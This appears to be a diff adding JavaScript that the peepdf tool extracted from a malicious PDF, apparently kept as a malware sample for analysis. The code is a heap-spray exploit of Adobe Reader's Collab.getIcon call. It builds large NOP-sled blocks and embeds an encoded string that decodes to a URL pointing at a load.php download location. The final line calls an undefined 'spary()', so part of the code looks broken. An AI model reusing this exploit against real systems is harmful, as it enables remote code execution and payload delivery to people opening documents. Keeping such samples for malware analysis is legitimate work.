@@ -1,0 +1,27 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+this.pdfscript()
+
+// peepdf comment: Javascript code located in object 13 (version 0)
+
+function pdfscript() {
+    var shellcode = unescape("%u7468%u7074%u2F3A%u652F%u6F72%u7272%u6E2E%u7465%u6C2F%u616F%u2E64%u6870%u3F70%u6469%u333D");
+    garbage = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090") + shellcode;
+    nopblock = unescape("%u9090%u9090");
+    headersize = 10;
+    acl = headersize + garbage.length;
+    while (nopblock.length < acl) nopblock += nopblock;
+    fillblock = nopblock.substring(0, acl);
+    block = nopblock.substring(0, nopblock.length - acl);
+    while (block.length + acl < 0x40000) block = block + block + fillblock;
+    memory = new Array();
+    for (i = 0; i < 180; i++) memory[i] = block + garbage;
+    var buffersize = 4012;
+    var buffer = Array(buffersize);
+    for (i = 0; i < buffersize; i++) {
+        buffer[i] = unescape("%0a%0a%0a%0a");
+    }
+    Collab.getIcon(buffer + '_N.bundle');
+}
+spary();
+
